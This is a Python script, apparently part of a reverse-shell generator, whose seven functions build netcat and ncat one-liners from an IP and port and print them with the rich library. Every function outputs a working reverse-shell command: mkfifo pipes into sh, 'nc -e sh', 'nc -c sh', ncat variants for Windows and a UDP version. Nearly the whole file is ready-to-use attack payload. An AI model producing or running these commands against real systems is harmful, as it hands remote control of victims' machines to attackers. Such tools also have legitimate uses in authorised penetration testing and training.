from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def nc_mkfifo(ip, port):
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def nc_e(ip, port):
    payload = f"nc {ip} {port} -e sh"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def nc_exe_e(ip, port):
    payload = f"nc.exe {ip} {port} -e sh"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def nc_c(ip, port):
    payload = f"nc -c sh {ip} {port}"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def ncat_e(ip, port):
    payload = f"ncat {ip} {port} -e sh"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def ncat_exe_e(ip, port):
    payload = f"ncat.exe {ip} {port} -e sh"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def ncat_UDP(ip, port):
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {ip} {port} >/tmp/f"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")
